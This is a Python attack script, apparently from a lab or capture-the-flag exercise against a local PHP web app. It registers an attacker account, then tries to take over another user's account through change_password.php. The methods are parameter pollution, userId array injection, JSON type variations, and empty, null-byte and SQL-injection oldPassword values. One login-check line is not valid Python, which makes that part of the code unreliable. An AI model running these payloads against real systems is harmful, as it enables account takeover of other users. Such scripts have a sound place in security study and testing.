import requests
import json

base_url = "http://127.0.0.1:32973"

session = requests.Session()

print("=" * 60)
print("REGISTERING NEW ATTACKER ACCOUNT")
print("=" * 60)

register_data = {
    "username": "testattacker",
    "email": "testattacker@test.com",
    "password": "hacker123!",
    "confirmPassword": "hacker123!"
}

reg_resp = session.post(f"{base_url}/api/register.php", data=register_data)
print(f"Register Status: {reg_resp.status_code}")
print(f"Register Response: {reg_resp.text}")

# Now login
print("\n" + "=" * 60)
print("LOGGING IN AS ATTACKER")
print("=" * 60)

login_data = {
    "username": "testattacker",
    "password": "hacker123!"
}

login_resp = session.post(f"{base_url}/api/login.php", data=login_data)
print(f"Login Status: {login_resp.status_code}")
print(f"Login Response: {login_resp.text}")
print(f"PHPSESSID Cookie: {session.cookies.get('PHPSESSID')}")

# Check if login was successful
login_success = "success":true in login_resp.text or return True in login_resp.text
if login_resp.status_code == 200 and login_success:
    print("\n[+] Login successful!")
else:
    print("\n[!] Login may have failed, checking session state...")
    # Check cookies anyway
    if session.cookies.get('PHPSESSID'):
        print(f"[+] Session cookie obtained: {session.cookies.get('PHPSESSID')}")

print("\n" + "=" * 60)
print("TESTING IDOR BYPASS TECHNIQUES")
print("=" * 60)

# Technique 1: Parameter pollution
print("\n[TECHNIQUE 1] Parameter Pollution")
print("-" * 60)

pollution_payload = "userId=7&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=17"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

pollution_resp = session.post(
    f"{base_url}/api/change_password.php",
    data=pollution_payload,
    headers=headers
)
print(f"Request: {pollution_payload}")
print(f"Response: {pollution_resp.text}")

# Technique 2: Array injection on userId
print("\n[TECHNIQUE 2] Array Injection")
print("-" * 60)

array_data = {
    "userId[]": ["7", "17"],
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

array_resp = session.post(f"{base_url}/api/change_password.php", data=array_data)
print(f"Request: userId[]=7&userId[]=17&oldPassword=hacker123!&...")
print(f"Response: {array_resp.text}")

# Technique 3: JSON with nested structure
print("\n[TECHNIQUE 3] JSON with various payloads")
print("-" * 60)

json_headers = {"Content-Type": "application/json"}
json_payloads = [
    {"userId": 7, "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": "7", "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": [7], "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, payload in enumerate(json_payloads, 1):
    resp = session.post(f"{base_url}/api/change_password.php", json=payload, headers=json_headers)
    print(f"\n[Payload {i}]")
    print(f"Data: {json.dumps(payload)}")
    print(f"Response: {resp.text}")

# Technique 4: Empty/null oldPassword attempts
print("\n[TECHNIQUE 4] Empty/Null oldPassword attempts")
print("-" * 60)

empty_tests = [
    {"userId": 7, "oldPassword": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "oldPassword": "\x00", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "oldPassword[]": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "oldPassword": "' OR '1'='1", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, test_data in enumerate(empty_tests, 1):
    resp = session.post(f"{base_url}/api/change_password.php", data=test_data)
    print(f"\n[Empty Test {i}]")
    print(f"Data: {test_data}")
    print(f"Response: {resp.text}")

# Technique 5: Changing our own password first
print("\n[TECHNIQUE 5] Check what happens with valid password change")
print("-" * 60)

no_id_data = {
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}
no_id_resp = session.post(f"{base_url}/api/change_password.php", data=no_id_data)
print(f"No userId request: {no_id_data}")
print(f"Response: {no_id_resp.text}")

